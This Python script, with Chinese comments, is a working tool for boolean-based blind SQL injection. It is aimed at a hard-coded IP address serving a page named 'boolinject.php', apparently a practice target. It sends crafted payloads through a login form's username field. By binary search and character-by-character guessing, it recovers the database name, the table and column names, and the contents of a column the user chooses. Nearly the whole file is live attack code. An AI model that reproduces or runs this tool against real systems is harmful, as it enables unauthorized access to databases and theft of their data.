import requests
from loguru import logger
import time
import collections
import tqdm  # 进度条库
import multiprocessing as mp

core_num = 14
value = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&^@_.-!{}"
'''
haveget:
        length:数据库长度
                curr:当前数据库长度
                t0:table数
                t1:table1长度
                t2:table2长度
                table:
                    c0:列数
                    c1:第1列长度
                    ………………     
                    column:
                        l0:行数
                        l1:行1长度
                        ………………



        database:数据库名字
                curr:当前数据库名字
        table:表名字
                curr:当前数据库内表
                    0:一共有几个表
                    1:第一个表名字
                    2:第二个表名字
                    ………………     
        column:列名字
                [table]:当前表
                        0:一共有几列
                        1:第一列
                        2:第二列
                        ………………
        data:
            [table]:表名
                    [column]:列名
                            0:一共有几行
                            1:第一行数据
                            2:第二行数据
                            ………………
'''
haveget = collections.defaultdict(dict)
url = 'http://81.69.222.229/boolinject.php'


def get_length_database(url):
    global haveget
    l, r = 0, 200
    while l < r:
        mid = l + ((r - l) >> 1)
        payload = "test' and length(database())>{0}#".format(mid)
        data = {"username": payload, "password": '123'}
        ans = requests.post(url, data=data)
        if 'correct' in ans.text:
            l = mid + 1
        else:
            r = mid
    print("...... database's length is :" + str(l))
    haveget['length'] = {'curr': l}
    return


def check_database(parameter):
    n, v, url = parameter
    payload = "test' and ascii(substr(database(),{0},1))={1}#".format(n, ord(v))
    data = {"username": payload, "password": '123'}
    ans = requests.post(url, data=data)
    if 'correct' in ans.text: return True
    return False


# 获取数据库名
def get_database(url):
    global haveget
    length = haveget['length']['curr'] + 1
    arg1 = [(i, j, url) for i in range(1, length) for j in value]
    with mp.Pool(core_num) as p:
        res = list(tqdm.tqdm(p.imap(check_database, arg1), total=len(arg1)))
    ans = [''] * 100
    for i in range(len(res)):
        if res[i]: ans[arg1[i][0]] = arg1[i][1]
    haveget['database'] = {'curr': ''.join(ans)}


# 获取表数量
def get_table_num(url):
    global haveget
    l, r = 0, 200
    while l < r:
        mid = l + ((r - l) >> 1)
        payload = "test' and (select count(*) from information_schema.tables where table_schema=database())>{0}#".format(
            mid)
        data = {"username": payload, "password": '123'}
        ans = requests.post(url, data=data)
        if 'correct' in ans.text:
            l = mid + 1
        else:
            r = mid
    print("...... table num is:" + str(l))
    haveget['length'] = {'t0': l}
    return


# 获取表长度
def check_length_table(parameter):
    i, url = parameter
    l, r = 0, 200
    while l < r:
        mid = l + ((r - l) >> 1)
        payload = "test' and (select length(table_name) from information_schema.tables where table_schema=database() limit {0},1)>{1} #".format(
            i, mid)
        data = {"username": payload, "password": '123'}
        ans = requests.post(url, data=data)
        if 'correct' in ans.text:
            l = mid + 1
        else:
            r = mid
    return l


# 获取表长度主函数
def get_length_table(url):
    global haveget
    arg1 = [(i, url) for i in range(haveget['length']['t0'])]
    with mp.Pool(core_num) as p:
        res = list(tqdm.tqdm(p.imap(check_length_table, arg1), total=len(arg1)))
    for i in range(len(res)):
        haveget['length']['t{}'.format(i + 1)] = res[i]
        print("...... table {0} length is:".format(i + 1) + str(res[i]))


# 判断表字符
def check_table(parameter):
    i, j, v, url = parameter
    # 一般payload，优化点与前述相同
    payload = "test' and ascii(substr((select table_name from information_schema.tables where table_schema =database() limit {0},1),{1},1))={2} #".format(
        i, j, ord(v))
    data = {"username": payload, "password": '123'}
    ans = requests.post(url, data=data)
    if 'correct' in ans.text: return True
    return False


# 获取表名
def get_table(url):
    global haveget
    haveget['table']['curr'] = {}
    arg1 = [(i, j, v, url) for i in range(haveget['length']['t0']) for j in
            range(1, haveget['length']['t{}'.format(i + 1)] + 1) for v in value]
    with mp.Pool(core_num) as p:
        res = list(tqdm.tqdm(p.imap(check_table, arg1), total=len(arg1)))
    ans = []
    for i in range(haveget['length']['t0']):
        ans.append([''] * (haveget['length']['t{}'.format(i + 1)] + 1))
    for i in range(len(res)):
        if res[i]:
            ans[arg1[i][0]][arg1[i][1]] = arg1[i][2]
    for i in range(haveget['length']['t0']):
        tmp = ''.join(ans[i])
        haveget['table']['curr'][i + 1] = tmp
        print('......table {0} is:'.format(i + 1) + tmp)
    haveget['table']['curr'][0] = haveget['length']['t0']


# 获取表的列数
def check_num_column(parameter):
    table, url = parameter
    l, r = 0, 200
    while l < r:
        mid = l + ((r - l) >> 1)
        payload = "test' and (select count(*) from information_schema.columns where table_name='{0}')>{1} #".format(
            table, mid)
        data = {"username": payload, "password": '123'}
        ans = requests.post(url, data=data)
        if 'correct' in ans.text:
            l = mid + 1
        else:
            r = mid
    return l


# 获取表的列数主函数
def get_column_num(url):
    global haveget
    arg1 = [(haveget['table']['curr'][i + 1], url) for i in range(haveget['table']['curr'][0])]
    with mp.Pool(core_num) as p:
        res = list(tqdm.tqdm(p.imap(check_num_column, arg1), total=len(arg1)))
    for i in range(len(res)):
        haveget['length'][haveget['table']['curr'][i + 1]] = {'c0': res[i]}
        print("......the column num of {0} table is:".format(i + 1) + str(res[i]))


# 获取列名长度
def check_length_column(parameter):
    table, j, url = parameter
    l, r = 0, 200
    while l < r:
        mid = l + ((r - l) >> 1)
        payload = "test' and (select length(column_name) from information_schema.columns where table_name='{0}' limit {1},1)>{2}#".format(
            table, j, mid)
        data = {"username": payload, "password": '123'}
        ans = requests.post(url, data=data)
        if 'correct' in ans.text:
            l = mid + 1
        else:
            r = mid
    return l


# 获取列名长度主函数
def get_length_column(url):
    global haveget
    arg1 = [(haveget['table']['curr'][i + 1], j, url) for i in range(haveget['table']['curr'][0]) for j in
            range(haveget['length'][haveget['table']['curr'][i + 1]]['c0'])]
    with mp.Pool(core_num) as p:
        res = list(tqdm.tqdm(p.imap(check_length_column, arg1), total=len(arg1)))
    for i in range(len(res)):
        haveget['length'][arg1[i][0]]['c{}'.format(arg1[i][1] + 1)] = res[i]
        print("......the length of {0} column {1} is:".format(arg1[i][0], arg1[i][1] + 1) + str(res[i]))


def check_column(parameter):
    table, i, j, v, url = parameter
    payload = "test' and ascii(substr((select column_name from information_schema.columns where table_name='{0}' limit {1}, 1), {2},1))={3} #".format(
        table, i, j, ord(v))
    data = {"username": payload, "password": '123'}
    ans = requests.post(url, data=data)
    if 'correct' in ans.text: return True
    return False


def get_column(url):
    global haveget
    arg1 = [(table, i, j, v, url) for k, table in haveget['table']['curr'].items() if k != 0 for i in
            range(haveget['length'][table]['c0']) for j in range(1, haveget['length'][table]['c{}'.format(i + 1)] + 1)
            for v in value]
    with mp.Pool(core_num) as p:
        res = list(tqdm.tqdm(p.imap(check_column, arg1), total=len(arg1)))
    ans = {}
    for k, table in haveget['table']['curr'].items():
        if k == 0: continue
        ans[table] = [[''] * (haveget['length'][table]['c{}'.format(i + 1)] + 1) for i in
                      range(haveget['length'][table]['c0'])]
    for i in range(len(res)):
        if res[i]: ans[arg1[i][0]][arg1[i][1]][arg1[i][2]] = arg1[i][3]
    for table, tmp in ans.items():
        haveget['column'][table] = {}
        for i in range(len(tmp)):
            haveget['column'][table][i + 1] = ''.join(tmp[i])
        haveget['column'][table][0] = len(tmp)
    print(haveget)


# 处理选择
def resolve_choose():
    global haveget
    '''---------------------------------处理选择--------------------------------------'''
    print('-------表单-------')
    for k, v in haveget['table']['curr'].items():
        if k != 0: print(str(k) + ': ' + v)
    print('-------表单-------\n')
    id = int(input('选择要爆破的表单编号:'))
    print('\n-------列名-------')
    try:
        for k, v in haveget['column'][haveget['table']['curr'][id]].items():
            if k != 0: print(str(k) + ': ' + v)
    except:
        print('抱歉，输入表单编号不存在！')
        exit()
    print('-------列名-------\n')

    table = haveget['table']['curr'][id]

    id = int(input('选择要爆破的列编号:'))
    print()
    try:
        column = haveget['column'][table][id]
    except:
        print('抱歉，输入列编号不存在！')
        exit()
    '''---------------------------------处理选择--------------------------------------'''
    try:
        haveget['data'][table][column][0]
    except:
        haveget['data'] = {table: {column: {0: 0}}}
    return table, column


# 获取表的行数
def get_num_data(table, column, url):
    global haveget
    haveget['length'][table][column] = {'l0': 0}
    l, r = 0, 200
    while l < r:
        mid = l + ((r - l) >> 1)
        payload = "test' and (select count(*) from {0})>{1} #".format(table, mid)
        data = {"username": payload, "password": '123'}
        ans = requests.post(url, data=data)
        if 'correct' in ans.text:
            l = mid + 1
        else:
            r = mid
    print("......the line number of {0} table is:".format(table) + str(l))
    haveget['length'][table][column]['l0'] = l
    return


def check_length_data(parameter):
    global haveget
    table, column, i, url = parameter
    l, r = 0, 200
    while l < r:
        mid = l + ((r - l) >> 1)
        payload = "test' and (select length({0}) from {1} limit {2}, 1)>{3}#".format(column, table, i, mid)
        data = {"username": payload, "password": '123'}
        ans = requests.post(url, data=data)
        if 'correct' in ans.text:
            l = mid + 1
        else:
            r = mid
    return l


# 获取每行数据长度
def get_length_data(table, column, url):
    global haveget
    arg1 = [(table, column, i, url) for i in range(haveget['length'][table][column]['l0'])]
    with mp.Pool(core_num) as p:
        res = list(tqdm.tqdm(p.imap(check_length_data, arg1), total=len(arg1)))
    for i in range(len(res)):
        haveget['length'][table][column]['l{}'.format(i + 1)] = res[i]
        print("......the length of {0} column {1} line {2} is:".format(table, column, i + 1) + str(res[i]))


def check_data(parameter):
    table, column, i, j, v, url = parameter
    payload = "test' and ascii(substr((select {0} from {1} limit {2}, 1), {3},1))={4} #".format(column, table, i, j,
                                                                                                ord(v))
    data = {"username": payload, "password": '123'}
    ans = requests.post(url, data=data)
    if 'correct' in ans.text: return True
    return False


def get_data(table, column, url):
    global haveget
    arg1 = [(table, column, i, j, v, url) for i in range(haveget['length'][table][column]['l0']) for j in
            range(1, haveget['length'][table][column]['l{}'.format(i + 1)] + 1) for v in value]
    with mp.Pool(core_num) as p:
        res = list(tqdm.tqdm(p.imap(check_data, arg1), total=len(arg1)))
    ans = [[''] * (haveget['length'][table][column]['l{}'.format(i + 1)] + 1) for i in
           range(haveget['length'][table][column]['l0'])]
    for i in range(len(res)):
        if res[i]: ans[arg1[i][2]][arg1[i][3]] = arg1[i][4]
    for i in range(len(ans)):
        retdata = ''.join(ans[i])
        haveget['data'][table][column][i + 1] = retdata
        print(".....the line {0} of {1}-{2} data is:".format(i + 1, table, column) + retdata, )
    haveget['data'][table][column][0] = len(ans)


def run(url, get):
    try:
        logger.info('{0}  正在获取当前数据库名长度......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
        get_length_database(url)
        logger.info('{0}  正在获取当前数据库名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
        get_database(url)
        print("\r", ".....the database name is :" + haveget['database']['curr'], flush=True)
    except:
        logger.error("注入目标非布尔盲注....")

    if get in ('table', 'columninfo', 'infomation', 'all'):
        try:
            logger.info('{0}  正在获取当前数据库内表单数......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
            get_table_num(url)
            logger.info('{0}  正在获取表单名长度......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
            get_length_table(url)
            logger.info('{0}  正在获取当前数据库表名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
            get_table(url)
        except:
            logger.error("获取表信息时出错....")

    if get in ('columninfo', 'infomation', 'all'):
        try:
            logger.info('{0}  正在获取当前各表列数......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
            get_column_num(url)
            logger.info('{0}  正在获取各列名长度......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
            get_length_column(url)
            logger.info('{0}  正在获取当前表列名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
            get_column(url)
        except:
            logger.error("获取列信息时出错....")

    if get in ('infomation', 'all'):
        try:
            # 处理选择
            chooseTable, chooseColumn = resolve_choose()
            logger.info('{0}  获取表单数据行数......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
            get_num_data(chooseTable, chooseColumn, url)
            logger.info('{0}  获取数据长度......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
            get_length_data(chooseTable, chooseColumn, url)
            logger.info('{0}  获取数据......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
            get_data(chooseTable, chooseColumn, url)
            logger.info('{0}  获取完毕！'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
        except:
            logger.error("获取数据库数据时出错....")
